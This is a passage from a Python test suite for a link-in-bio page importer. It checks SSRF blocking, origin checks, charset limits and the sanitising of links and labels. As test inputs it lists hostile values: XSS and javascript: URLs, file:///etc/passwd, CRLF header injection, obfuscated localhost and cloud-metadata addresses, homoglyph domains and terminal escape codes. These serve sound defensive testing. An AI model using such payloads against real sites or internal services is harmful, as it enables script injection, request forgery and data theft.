    assert status["twitter", "example_user1"] == status["tiktok", "new.one"] == "linked"


def test_an_account_of_someone_else(bio, client, monkeypatch):
    page = '<a href="https://instagram.com/bob.example">bob</a><a href="https://www.tiktok.com/@example_user6">t</a>'
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    [bob, tiktok] = r["accounts"]
    assert bob["status"] == "other" and bob["person"]["name"] == "Bob" and bob["account"]["id"] == "222"
    assert tiktok["status"] == "indexed" and tiktok["account"]["handle"] == "example_user6"


def test_an_empty_page(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", bio_net("").fetcher())
    assert bio_import(client, bio["id"]) == {
        "ok": True, "url": "https://linktr.ee/alice", "accounts": [],
        "links": {"saved": 1, "already": 0, "shared": 0, "over": 0, "dropped": 0}}
    assert saved(client, bio["id"]) == [("https://linktr.ee/alice", "")]      # the page itself is kept


class Untouchable:
    def fetch(self, url):
        raise AssertionError("fetched")


def test_switched_off_nothing_is_fetched(env, client, monkeypatch):
    from test_people import create
    p = create(client, "Alice")["person"]
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    r = bio_import(client, p["id"], status=403)
    assert r == {"ok": False, "error": "link-in-bio import is off: turn it on in Settings → Downloads"}


def test_refusals_from_the_endpoint(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    assert bio_import(client, 999, status=404)["error"] == "no such person"
    for body in (None, {}, {"url": 3}, {"url": "https://linktr.ee/a", "extra": 1}, ["https://linktr.ee/a"]):
        r = client.post(f"/api/people/{bio['id']}/bio-import", json=body, headers=H)
        assert r.status_code == 400
    assert "not an allowed site" in bio_import(client, bio["id"], "https://evil.example/a", status=400)["error"]
    assert bio_import(client, bio["id"], "http://linktr.ee/a", status=400)["error"] == "only https links"
    for foreign in ({"Origin": "https://www.instagram.com"}, {"Sec-Fetch-Site": "cross-site"}):
        r = bio_import(client, bio["id"], headers={**H, **foreign}, status=403)
        assert "own dashboard" in r["error"]
    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"})
    assert r.status_code == 403                                             # no X-FeedVault
    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"}, headers={**H, "Host": "evil.example"})
    assert r.status_code == 403 and r.get_json()["error"] == "forbidden host"


def test_a_failed_fetch_is_a_502_with_its_reason(bio, client, monkeypatch, capsys):
    net = Net(dns={"linktr.ee": ["10.0.0.1"]})
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], status=502)
    assert r["error"] == "linktr.ee's address is not public (10.0.0.1)"
    out = capsys.readouterr().out
    assert "link-in-bio import of https://linktr.ee/alice: linktr.ee's address is not public" in out


def test_the_page_is_never_logged(bio, client, monkeypatch, capsys):
    secret = "<a href='https://x.com/example_user1'>SECRET-PAGE-TEXT</a>"
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(secret).fetcher())
    bio_import(client, bio["id"])
    out = capsys.readouterr()
    assert "SECRET-PAGE-TEXT" not in out.out + out.err
    assert ("https://linktr.ee/alice: 1 accounts, 2 links saved, 0 saved already and now theirs too, 0 theirs already, "
            "0 dropped, 0 over the limit") in out.out


def test_busy_is_a_429(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    with biofetch._busy:
        assert "another" in bio_import(client, bio["id"], status=429)["error"]


@pytest.mark.parametrize("charset", ["idna", "undefined", "rot13", "hex", "base64"])
def test_a_charset_that_is_not_a_text_codec_falls_back_to_utf8(charset):
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"<p>ok</p>", headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == "<p>ok</p>"


@pytest.mark.parametrize("link", [
    "https://www.youtube.com/shorts/AbC123xyz", "https://www.youtube.com/shorts", "https://www.pixiv.net/en/artworks/12345",
    "https://www.youtube.com/@name/shorts/AbC", "https://www.tiktok.com/@name/video/1",
])
def test_posts_and_videos_are_not_profiles(link):
    table = {**ROUTES, "pixiv.net": "gallery-dl"}
    assert biofetch.profile(link, table) is None


def test_profile_prefixes_still_work():
    table = {**ROUTES, "pixiv.net": "gallery-dl"}
    assert biofetch.profile("https://www.pixiv.net/en/users/12345", table)[1] == "12345"
    assert biofetch.profile("https://www.youtube.com/@name/shorts", ROUTES)[1] == "name"


def test_a_broken_link_in_the_page_is_counted_not_a_crash(bio, client, monkeypatch):
    page = '<a href="https://[oops">x</a><a href="https://x.com/example_user1">x</a>'
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    assert len(r["accounts"]) == 1 and r["links"]["saved"] == 2 and r["links"]["dropped"] == 1


# ---------------------------------------------------------------------------
# Security audit 3
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("address", ["fec0::1", "feff:ffff::1", "3fff::1", "3fff:fff:ffff::1"])
def test_site_local_and_documentation_v6_are_not_public(address):
    """fec0::/10 (site-local, deprecated but still routed on some networks)
    and 3fff::/20 (documentation) pass ipaddress' is_global on Python 3.12."""
    assert not biofetch.public(address)
    net = Net(dns={"linktr.ee": [address]})
    assert "address is not public" in refused(net, "https://linktr.ee/alice")
    assert net.connects == []


@pytest.mark.parametrize("charset", ["punycode", "utf-7", "raw_unicode_escape", "unicode_escape"])
def test_only_web_charsets_decode_the_page(charset):
    """Python's punycode decoder is quadratic (2 MB took 156 s of CPU, under
    the fetch lock and past the time limit); a page decodes with the charsets
    web pages use, else as UTF-8."""
    body = b"x-" + b"a" * 64
    net = Net(pages={("linktr.ee", "/a"): html_answer(body, headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == body.decode()


@pytest.mark.parametrize("charset, text", [
    ("Shift_JIS", "リンク"), ("windows-1251", "ссылка"), ("utf-16", "<a href='x'>"), ("windows-874", "ลิงก์"), ("gb18030", "链接"), ("latin-1", "café"), ("us-ascii", "ok"),
])
def test_web_charsets_still_decode(charset, text):
    net = Net(pages={("linktr.ee", "/a"): html_answer(text.encode(biofetch._CHARSET_ALIASES.get(charset, charset)), headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == text


@pytest.mark.parametrize("headers", [
    {"Content-Type": "text/\x1b[2J\x1b]0;owned\x07plain"},
    {"Content-Type": "text/\x9b31mplain"},
])
def test_site_text_in_an_error_has_no_control_characters(bio, client, monkeypatch, capsys, headers):
    """The error shown and logged quotes the site's Content-Type (or a
    redirect's host): escape sequences must not reach the terminal."""
    net = bio_net("<p>x</p>")
    net.pages["linktr.ee", "/alice"] = html_answer(b"x", headers=headers)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], status=502)
    out = capsys.readouterr().out
    assert r["error"].startswith("not a web page")
    for text in (r["error"], out):
        assert not any(not c.isprintable() and c != "\n" for c in text), repr(text)


def test_a_redirect_host_in_an_error_has_no_control_characters():
    net = Net(pages={("linktr.ee", "/a"): redirect("https://evil\x9b31m.example/")})
    error = refused(net, "https://linktr.ee/a")
    assert "not an allowed site" in error and all(c.isprintable() for c in error), repr(error)


def test_the_tls_handshake_has_one_total_limit():
    """The handshake runs under the socket's timeout as a whole (CPython's
    _ssl keeps one deadline across its reads), not a fresh timeout per read:
    a site dripping a byte every 0.2 s is cut at the time left. A local
    socket pair, nothing leaves this machine."""
    import threading
    import time
    a, b = socket.socketpair()
    stop = threading.Event()

    def drip():
        b.recv(65536)                                        # the ClientHello
        b.sendall(b"\x16\x03\x03\x40\x00")                   # a 16 KB handshake record follows...
        while not stop.wait(0.2):
            try:
                b.sendall(b"\x00")                           # ...a byte at a time
            except OSError:
                return
    threading.Thread(target=drip, daemon=True).start()
    a.settimeout(0.6)
    start = time.monotonic()
    try:
        with pytest.raises((socket.timeout, ssl.SSLError)):
            biofetch.system_wrap(a, "linktr.ee")
        assert time.monotonic() - start < 2
    finally:
        stop.set()
        a.close()
        b.close()


def test_web_charsets_are_codec_names():
    import codecs
    for name in biofetch.WEB_CHARSETS:
        assert codecs.lookup(name).name == name
    for alias, name in biofetch._CHARSET_ALIASES.items():
        assert codecs.lookup(name).name in biofetch.WEB_CHARSETS


@pytest.mark.parametrize("foreign", [{"Origin": "https://www.instagram.com"}, {"Sec-Fetch-Site": "cross-site"}])
def test_settings_cannot_be_changed_from_another_site(env, client, foreign):
    """Audit 3: the switch (and every other setting: tools, roots, the
    schedules' pause) is the dashboard's; the userscript never writes it."""
    import config
    for body in ({"bio_import": True}, {"schedules_paused": False}, {"tools": {"yt-dlp": "/tmp/yt-dlp-x"}}):
        r = client.post("/api/config", json=body, headers={**H, **foreign})
        assert r.status_code == 403 and "own dashboard" in r.get_json()["error"]
    assert not biofetch.enabled(config.load())
    assert client.post("/api/config", json={"bio_import": True}, headers={**H, "Origin": "http://localhost:5173",
                                                                          "Sec-Fetch-Site": "same-origin"}).get_json()["ok"]


# ---------------------------------------------------------------------------
# Keeping the page's links: an import saves them to the person's Links
# ---------------------------------------------------------------------------

def linktree_page(buttons, socials=()):
    """A page shaped like the one linktr.ee serves (hand-written, no copy):
    no anchor at all, the buttons and icons in __NEXT_DATA__ twice over
    (account.links and pageProps.links), between the avatar, the theme's
    files, the site's settings and its own advertisers."""
    import json
    ugc = "https://ugc.production.linktr.ee"
    links = [{"context": {"monetization": None}, "id": 500000 + i, "type": b.get("type", "CLASSIC"), "position": i,
              "title": b.get("title"), "url": b.get("url"), "shouldRouteToProfile": False,
              "modifiers": {"animation": None, "isForwarding": False, "thumbnailUrl": f"{ugc}/thumb-{i}.jpeg",
                            "layoutOption": "stack"},
              "rules": {"gate": {"activeOrder": [], "sensitiveContent": {"domain": ""}, "age": None}},
              "metadata": {"title": None, "image": f"https://shop-pictures.example/og/{i}.png", "imageAlt": None},
              "parent": None} for i, b in enumerate(buttons)]
    account = {
        "id": 1234567, "uuid": "0d7c1f0e-0000-4000-8000-000000000001", "username": "alice", "isActive": True,
        "profilePictureUrl": f"{ugc}/0d7c1f0e_avatar.jpeg", "customAvatar": f"{ugc}/0d7c1f0e_avatar.jpeg",
        "bannerImage": None, "pageTitle": "Alice", "description": "Painter. https://not-a-button.example in the bio text",
        "googleAnalyticsId": None, "facebookPixelId": None,
        "backgroundImageAttributes": {"url": f"{ugc}/0d7c1f0e_background.jpeg"},
        "theme": {"key": "custom", "background": {"type": "image", "url": "https://assets.production.linktr.ee/profiles/t.svg"},
                  "typeface": {"family": "Inter", "url": "https://fonts.gstatic.com/s/inter/v13/inter.woff2"}},
        "socialLinks": [{"type": kind, "url": url, "position": i} for i, (kind, url) in enumerate(socials)],
        "links": links, "pinnedLinks": [], "socialFeeds": [],
    }
    data = {
        "props": {"pageProps": {
            "account": account, "theme": account["theme"], "username": "alice", "pageTitle": "Alice",
            "customAvatar": account["customAvatar"], "socialLinks": account["socialLinks"],
            "links": [{**x, "thumbnail": f"{ugc}/thumb.jpeg", "metaData": {"image": "https://linktr.ee/og/image/alice.jpg"}}
                      for x in links],
            "leapLink": None,
            "environment": {
                "INGRESS_API_ENDPOINT": "https://ingress.linktr.ee/abc", "GRAPHQL_API_ENDPOINT": "https://graph.linktr.ee/graphql",
                "BASE_PROFILE_URL": "https://linktr.ee", "CDN_DISTRIBUTION_URL": "https://assets.production.linktr.ee/profiles/",
                "META_IMAGE_URL": "https://assets.production.linktr.ee/profiles/_next/static/default-meta-image.png",
                "PAYMENTS_URL": "https://pay.payments-provider.example/v3"},
            "statsigInitValues": {"dynamicConfigs": {"manual_sponsorships": {"data": [
                {"image": "https://assets.production.linktr.ee/soco/banners/brand.webp",
                 "metadata": {"vendorIcon": "https://assets.production.linktr.ee/soco/icons/brand.webp"},
                 "title": "Watch Brand+", "url": "https://sponsor-ads.example/direct/plat123"}]}}},
            "dataFeedsProfileUrl": "https://data-feeds.example/profiles/alice",
            "latestBlogPosts": [{"title": "How to grow", "url": "https://linktr.ee/blog/how-to-grow"}],
            "googleAdConfig": {"scriptUrl": "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"},
        }},
        "page": "/[profile]", "query": {"profile": "alice"}, "buildId": "AbCdEfGh",
        "assetPrefix": "https://assets.production.linktr.ee/profiles", "locale": "en", "scriptLoader": [],
    }
    ld = {"@context": "https://schema.org", "@type": "ProfilePage", "mainEntity": {
        "@type": "Person", "name": "Alice", "url": "https://linktr.ee/alice", "image": account["profilePictureUrl"],
        "sameAs": [url for _, url in socials]}}
    return ('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Alice | Linktree</title>'
            '<link rel="preload" as="style" href="https://assets.production.linktr.ee/profiles/_next/static/css/a1.css">'
            '<link rel="icon" href="https://assets.production.linktr.ee/profiles/favicon.ico">'
            '<link rel="canonical" href="https://linktr.ee/alice">'
            '<meta property="og:image" content="https://linktr.ee/og/image/alice.jpg">'
            f'<script type="application/ld+json">{json.dumps(ld)}</script>'
            '<script async src="https://www.googletagmanager.com/gtag/js?id=G-0000"></script></head>'
            '<body><div id="__next"><div id="profile-container"></div></div>'
            f'<script id="__NEXT_DATA__" type="application/json">{json.dumps(data)}</script>'
            '<script src="https://assets.production.linktr.ee/profiles/_next/static/chunks/main-1.js" defer></script>'
            '</body></html>')


BUTTONS = [
    {"title": "My Patreon", "url": "https://www.patreon.com/alice"},
    {"title": "  Merch &\n prints ", "url": "https://alice-shop.example/store?ref=linktree"},
    {"type": "HEADER", "title": "Elsewhere", "url": None},
    {"title": "Discord", "url": "https://discord.gg/AbCdEf"},
    {"type": "YOUTUBE_VIDEO", "title": "Latest video", "url": "https://www.youtube.com/watch?v=abc123"},
    {"title": "My band's page", "url": "https://linktr.ee/alice.band"},           # the bio site itself: not kept
    {"title": "Email me", "url": "mailto:alice@alice.example"},                   # refused, counted
    {"title": "X / Twitter", "url": "https://x.com/Example_User1"},
    {"title": "Press kit", "url": "https://alice.example/press-kit.pdf"},
    {"title": "A picture", "url": "https://alice.example/portrait.jpg"},         # a file to show, not a page
]
SOCIALS = [("INSTAGRAM", "https://www.instagram.com/alice.example/"), ("TIKTOK", "https://www.tiktok.com/@new.one"),
           ("EMAIL_ADDRESS", "mailto:alice@alice.example")]
LINKTREE_PAGE = linktree_page(BUTTONS, SOCIALS)
LINKTREE_KEPT = [
    ("https://linktr.ee/alice", ""),
    ("https://www.instagram.com/alice.example/", ""), ("https://www.tiktok.com/@new.one", ""),
    ("https://www.patreon.com/alice", "My Patreon"),
    ("https://alice-shop.example/store?ref=linktree", "Merch & prints"), ("https://discord.gg/AbCdEf", "Discord"),
    ("https://www.youtube.com/watch?v=abc123", "Latest video"), ("https://x.com/Example_User1", "X / Twitter"),
    ("https://alice.example/press-kit.pdf", "Press kit"),
]

# A site that draws its links as anchors (hand-written, as lnk.bio and the
# like serve them): the buttons, between the site's own pages, its CDN's
# files and links that are not web addresses.
LNK_BIO_PAGE = """<!DOCTYPE html><html lang="en"><head><title>Alice | Lnk.Bio</title>
<link rel="stylesheet" href="https://cdn.lnk.bio/css/app.min.css"><link rel="icon" href="https://lnk.bio/favicon.ico">
<link rel="canonical" href="https://lnk.bio/alice">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0000"></script>
<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Person", "name": "Alice",
 "url": "https://lnk.bio/alice", "image": "https://cdn.lnk.bio/profilepics/alice.jpg",
 "sameAs": ["https://www.twitch.tv/alice_live", "https://ko-fi.com/alice/"]}</script>
<style>a.button { background: url(https://cdn.lnk.bio/img/bg.png) }</style></head><body>
<header><a href="https://lnk.bio/"><img src="https://cdn.lnk.bio/img/logo.svg" alt="Lnk.Bio"></a></header>
<a class="avatar" href="https://cdn.lnk.bio/profilepics/alice_full.jpg"><img src="https://cdn.lnk.bio/profilepics/alice.jpg" alt="Alice"></a>
<a class="social" href="https://www.instagram.com/alice.example/" aria-label="Instagram" rel="noopener"><svg viewBox="0 0 24 24"><path d="M0 0"/></svg></a>
<a class="button" href="https://ko-fi.com/alice" target="_blank" rel="noopener"><span class="title">  Buy me
   a coffee </span><script>track("https://tracker.example/click")</script></a>
<a class="button" href="https://alice.example/blog?utm_source=lnkbio">My <b>blog</b></a>
<a class="button" href="//alice-store.example/prints">Prints</a>
<a class="button" href="https://discord.gg/AbCdEf"><img src="https://cdn.lnk.bio/img/discord.svg" alt="Discord server"></a>
<a class="button" href="https://media.alice.example/intro.mp4">Intro video</a>
<a class="button" href="https://static.files-host.example/alice/presskit.zip">Press kit</a>
<a href="mailto:alice@alice.example">Email</a> <a href="tel:+15550100">Call</a>
<a href="javascript:void(0)" onclick="share()">Share</a> <a href="#top">Top</a> <a href="/alice/subscribe">Subscribe</a>
<map><area href="https://alice.example/map" alt="Where I show"></map>
<footer><a href="https://lnk.bio/privacy">Privacy</a> <a href="https://help.lnk.bio/report?u=alice">Report</a>
<a href="https://lnk.bio/signup?ref=alice">Create your own Lnk.Bio</a></footer>
<img src="https://www.facebook.com/tr?id=1&ev=PageView" width="1" height="1" alt="">
</body></html>"""
LNK_BIO_KEPT = [
    ("https://lnk.bio/alice", ""), ("https://www.instagram.com/alice.example/", "Instagram"),
    ("https://ko-fi.com/alice", "Buy me a coffee"), ("https://alice.example/blog", "My blog"),
    ("https://alice-store.example/prints", "Prints"), ("https://discord.gg/AbCdEf", "Discord server"),
    ("https://alice.example/map", "Where I show"), ("https://www.twitch.tv/alice_live", ""),
    ("https://ko-fi.com/alice/", ""),          # another spelling of a link kept: links.keep passes it over
]


def test_a_linktree_page_keeps_its_buttons_and_icons_only():
    found, dropped = biofetch.shown_links(LINKTREE_PAGE, "https://linktr.ee/alice", ROUTES)
    assert found == LINKTREE_KEPT
    assert dropped == 1                        # the mailto: link, once though it is there three times
    # What profile detection reads is what it read before: every address in the page.
    every = biofetch.page_links(LINKTREE_PAGE)
    assert "https://ugc.production.linktr.ee/0d7c1f0e_avatar.jpeg" in every
    assert "https://sponsor-ads.example/direct/plat123" in every
    assert {(p[0], p[1]) for p in filter(None, (biofetch.profile(x, ROUTES) for x in every))} == {
        ("instagram", "alice.example"), ("tiktok", "new.one"), ("twitter", "Example_User1")}


def test_an_anchor_page_keeps_its_buttons_only():
    found, dropped = biofetch.shown_links(LNK_BIO_PAGE, "https://lnk.bio/alice", ROUTES)
    assert found == LNK_BIO_KEPT
    assert dropped == 3                        # mailto:, tel:, javascript:


# A Linkme page as the site serves it (TanStack Start, drawn on the
# server): the links are anchors, between its media CDN's images, its
# footer's pages on about.link.me, its build's files and its serialized
# state, a script never read.
LINKME_PAGE = """<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/>
<link rel="preload" as="image" href="https://media.link.me/_resize/image/width=100,quality=90,format=webp/images/user-profile/1/alice.jpeg"/>
<link rel="preload" as="image" href="https://media.link.me/_resize/image/width=64,quality=90,format=webp/images/style/icons/v5.0/Twitch-1.png"/>
<link rel="preload" as="image" href="/images/noshoutmedia.png"/><link rel="stylesheet" href="/build/index-AbCd.css"/>
<link rel="icon" href="/favicon.ico"/><link rel="canonical" href="https://link.me/alice"/>
<script id="linkme-google-analytics-bootstrap">window.dataLayer = []</script>
<script type="application/ld+json">{"@context":"https://schema.org/","@type":"ProfilePage",
 "mainEntity":{"@id":"alice","@type":"Person","name":"@alice","identifier":"alice",
 "image":"https://media.link.me/_resize/image/quality=90,format=webp/images/user-profile/1/alice.webp",
 "url":"https://link.me/alice"},"significantLink":"https://link.me/alice","isPartOf":"https://link.me/",
 "thumbnailUrl":"https://media.link.me/_resize/image/quality=90,format=webp/images/user-profile/1/alice.webp"}</script>
</head><body><main><div id="profileContainer" class="dark">
<a style="background-color:#000000ff" href="https://twitch.tv/alice_live" class="singlealbum socialmedialink" target="_blank">
<div class="imgbox"><img src="https://media.link.me/_resize/image/width=1092/images/external-links/1/1.jpeg" alt="LinkMe" title="LinkMe"/></div>
<div class="iconbox"><img src="https://media.link.me/_resize/image/width=64/images/style/icons/v5.0/Twitch-1.png" alt="Twitch"/></div>
<div class="albumtextbox"><div class="first"><p><span style="color:#ffffffff">twitch</span></p></div></div></a>
<a style="background-color:#000000ff" href="https://www.instagram.com/alice.example?igsh=AbCd%3D%3D&amp;utm_source=qr" class="singlealbum socialmedialink" target="_blank">
<div class="iconbox"><img src="https://media.link.me/_resize/image/width=64/images/style/icons/v5.0/Instagram-1.png" alt="Instagram"/></div>
<div class="albumtextbox"><div class="first"><p><span>instagram</span></p></div></div></a>
</div><footer><a href="https://about.link.me/privacypolicy" class="underline">Privacy Policy</a>
<a href="https://about.link.me/termsandconditions" class="underline">Terms</a></footer></main>
<script class="$tsr">$R[0]={manifest:{css:["/build/index-AbCd.css"]},links:[{url:"https://twitch.tv/alice_live"},
{url:"https://evil.example/from-the-script"}]}</script>
<script type="module" async="" src="/build/entry-AbCd.js"></script></body></html>"""
# The Instagram button's ?igsh=…&utm_source=qr is dropped (links.clean_url).
LINKME_KEPT = [
    ("https://link.me/alice", ""), ("https://twitch.tv/alice_live", "twitch"),
    ("https://www.instagram.com/alice.example", "instagram"),
]


def test_a_linkme_page_keeps_its_links_only():
    found, dropped = biofetch.shown_links(LINKME_PAGE, "https://link.me/alice", ROUTES)
    assert found == LINKME_KEPT and dropped == 0
    assert not any("link.me/" in url for url, _ in found[1:])        # no media., about. or the page again
    table = {**ROUTES, "twitch.tv": "yt-dlp"}
    assert {(p[0], p[1]) for p in filter(None, (biofetch.profile(x, table) for x in biofetch.page_links(LINKME_PAGE)))} \
        == {("twitch", "alice_live"), ("instagram", "alice.example")}


def test_the_page_imported_is_saved_without_its_tracking():
    """The page's own address is cleaned as every link is: the one pasted
    from a share sheet (?utm_source=ig_share…) is saved bare."""
    found, _ = biofetch.shown_links(LINKME_PAGE, "https://link.me/alice?utm_source=ig&igsh=AbCd&fbclid=x", ROUTES)
    assert found == LINKME_KEPT


def test_a_linkme_import_end_to_end(bio, client, monkeypatch):
    from test_people import post
    post(client, "/api/config", {"routes": {**ROUTES, "twitch.tv": "yt-dlp"}})
    net = Net(dns={"link.me": [PUBLIC]}, pages={("link.me", "/alice"): html_answer(LINKME_PAGE.encode())})
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], url="https://link.me/alice")
    assert {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]} == {
        ("twitch", "alice_live"): "new", ("instagram", "alice.example"): "linked"}
    assert r["links"] == {"saved": 3, "already": 0, "shared": 0, "over": 0, "dropped": 0}
    assert saved(client, bio["id"]) == LINKME_KEPT
    assert net.connects == [PUBLIC] and net.lookups == ["link.me"]


@pytest.mark.parametrize("link", [
    "https://media.link.me/_resize/image/width=64/images/a.png", "https://about.link.me/privacypolicy",
    "https://link.me/bob", "https://www.link.me/alice",
])
def test_linkme_own_pages_are_not_links_to_keep(link):
    assert biofetch._visitor_url(link, ("link.me",)) == (None, "plumbing")


@pytest.mark.parametrize("link", [
    "https://linktr.ee/s/about", "https://www.linktr.ee/bob", "https://ugc.production.linktr.ee/a", "https://linktree.com/",
    "https://d1234abcd.cloudfront.net/a", "https://bucket.s3.amazonaws.com/a", "https://fonts.googleapis.com/css2?family=Inter",
    "https://www.googletagmanager.com/gtag/js?id=G-1", "https://cdn.shop.example/a", "https://cdn2.shop.example/a",
    "https://static-files.shop.example/a", "https://api.shop.example/v1/me", "https://images.shop.example/a",
    "https://shop.example/a.PNG", "https://shop.example/font.woff2", "https://shop.example/app.js?v=3",
    "https://shop.example/style.css", "https://shop.example/data.json", "https://schema.org", "https://www.w3.org/2000/svg",
])
def test_plumbing_is_not_a_link_to_keep(link):
    assert biofetch._visitor_url(link, ("linktr.ee", "linktree.com")) == (None, "plumbing")


@pytest.mark.parametrize("link, kept", [
    ("https://www.patreon.com/alice", "https://www.patreon.com/alice"),
    ("HTTP://Shop.Example:80/", "http://shop.example"),
    ("https://beacons.ai/alice", "https://beacons.ai/alice"),                  # another bio site is a link like any
    ("https://music.apple.com/us/artist/alice/1", "https://music.apple.com/us/artist/alice/1"),
    ("https://open.spotify.com/artist/1", "https://open.spotify.com/artist/1"),
    ("https://alice.example/jsmith", "https://alice.example/jsmith"),
    ("https://alice.example/files/kit.pdf", "https://alice.example/files/kit.pdf"),
    ("https://alice.co.uk/", "https://alice.co.uk"),
    # Past the host, as a browser sends it: no override or look-alike letter is stored as it is.
    ("https://shop.example/café?q=‮gnp#а", "https://shop.example/caf%C3%A9?q=%E2%80%AEgnp#%D0%B0"),
    ("https://shop.example/a%20b?x=1&y=%2F", "https://shop.example/a%20b?x=1&y=%2F"),
    ("https://bücher.example/a", "https://xn--bcher-kva.example/a"),      # stored as the name it is
    ("https://раypal.example/", "https://xn--ypal-43d9g.example"),   # a look-alike shows as one
    ("https://ｓｈｏｐ.example/", "https://shop.example"),     # fullwidth letters are the plain ones
])
def test_links_kept_as_links_py_stores_them(link, kept):
    assert biofetch._visitor_url(link, ("linktr.ee",)) == (kept, None)


@pytest.mark.parametrize("link", [
    "javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd", "ftp://files.example/a", "mailto:a@b.example", "vbscript:x", "blob:https://a.example/1",
    "https://user:pw@evil.example/", "https://evil.example@shop.example/", "https://evil.example\\@shop.example/",
    "https://shop.example/a b", "https://shop.example/\x1b[31m", "https://shop.example/\r\nSet-Cookie: a=b",
    "https://shop.example/" + "a" * 2100, "https://shop.example/\ud800x", "https://","https:///nohost", "https://shop.example:99999/",
    # Nothing on the user's own machine or network, however it is spelled.
    "http://127.0.0.1:3380/api/config", "http://localhost/", "http://localhost.:3380/", "https://LOCALHOST/",
    "http://[::1]/", "http://[::ffff:10.0.0.1]/", "http://192.168.1.1/admin", "http://10.0.0.1/", "http://2130706433/",
    "http://0x7f.0.0.1/", "http://0x7f.1/", "http://017700000001/", "http://127.1/", "http://169.254.169.254/latest",
    "https://router.local/", "https://nas.lan/", "https://printer.home/", "https://db.internal/", "https://intranet/",
    "http://１２７.0.0.1/", "http://127。0。0。1/", "https://shop.example:8443/",
    "https://sh_op.example/", "https://-shop.example/", "https://shop..example/", "https://%6c%6fcalhost/",
])
def test_links_refused_and_counted(link):
    assert biofetch._visitor_url(link, ("linktr.ee",)) == (None, "refused")
    page = '<a href="%s">Click here</a>' % link.replace('"', "&quot;").replace("<", "&lt;")
    assert biofetch.shown_links(page, "https://linktr.ee/alice", ROUTES)[0] == [("https://linktr.ee/alice", "")]


@pytest.mark.parametrize("label, title", [
    ("  Buy me\n\ta   coffee ", "Buy me a coffee"),
    ("<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>"),          # text, and shown as text
    ("\x1b[31mred\x1b[0m\x00\x07 alert", "[31mred [0m alert"),
    ("safe‮gnp.exe", "safegnp.exe"),                                       # no right-to-left override
    ("in​vis﻿ible⁦⁩­", "invisible"),
    ("line break s\x85here", "line break s here"),
    ("\U0001f469‍\U0001f4bb my blog", "\U0001f469‍\U0001f4bb my blog"),   # an emoji's joiner stays
    ("\ud800 lone surrogate", "lone surrogate"),
    ("x" * 5000, "x" * 300),
    ("", ""), ("   ", ""), (None, ""), (7, ""), (["a"], ""), ({"title": "a"}, ""),
])
def test_labels_are_plain_bounded_text(label, title):
    assert biofetch.clean_label(label) == title
    import links
    assert len(title) <= links.MAX_TITLE and links.clean_title(title) == title


@pytest.mark.parametrize("label, title", [
    ("My shop", "My shop"), ("shop.example/alice", "shop.example/alice"), ("See www.shop.example", "See www.shop.example"),
    ("@alice.example on Instagram", "@alice.example on Instagram"), ("v2.0 out now", "v2.0 out now"),
    # A label that reads as another site's address would pass for where the link goes.
    ("https://www.patreon.com/alice", ""), ("Go to www.paypal.com now", ""), ("paypal.com/signin", ""),
    ("HTTPS://PAYPAL.COM", ""), ("http://user@shop.example", ""),
])
def test_a_label_naming_another_site_is_not_used(label, title):
    assert biofetch.clean_label(label, "https://shop.example/alice") == title


HOSTILE = """<a href="https://ok.example/1"><script>alert(1)</script><style>a{}</style><b>Click</b>\x1b[2J ‮me</a>
<a href="https://ok.example/2" title="&lt;script&gt;alert(2)&lt;/script&gt;"></a>
<a href="https://ok.example/3">%s</a><a href="https://ok.example/4">https://www.patreon.com/alice</a>
<a href="javascript:fetch('/api/config')">Free</a><a href="http://127.0.0.1:3380/api/people/1">Local</a>
<a href="https://ok.example/5" onclick="steal()"><img src="https://cdn.ok.example/x.png" alt='" onerror="alert(5)'></a>
<a href="https://ok.example/never-closed">open
<script type="application/json">{"links": [
  {"title": {"$gt": ""}, "url": "https://ok.example/6"}, {"title": ["a"], "url": "https://ok.example/7"},
  {"title": "T", "url": ["https://ok.example/8", {"url": "https://ok.example/9"}]},
  {"title": "T", "url": 5}, {"title": "T", "url": null}, {"title": "T", "url": "https://ok.example/\\ud800"}, {"title": "T", "url": {"href": "data:text/html,x"}},
  {"title": "T\\u0000\\u001b[1m\\u202e", "url": " https://ok.example/10 "}]}</script>""" % ("y" * 5000)


def test_a_hostile_page_saves_only_clean_links(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(HOSTILE).fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 12, "already": 0, "shared": 0, "over": 0, "dropped": 4}
    assert saved(client, bio["id"]) == [
        ("https://linktr.ee/alice", ""), ("https://ok.example/1", "Click [2J me"),
        ("https://ok.example/2", "<script>alert(2)</script>"), ("https://ok.example/3", "y" * 300),
        ("https://ok.example/4", ""), ("https://ok.example/5", '" onerror="alert(5)'),
        ("https://ok.example/never-closed", "open"), ("https://ok.example/6", ""), ("https://ok.example/7", ""),
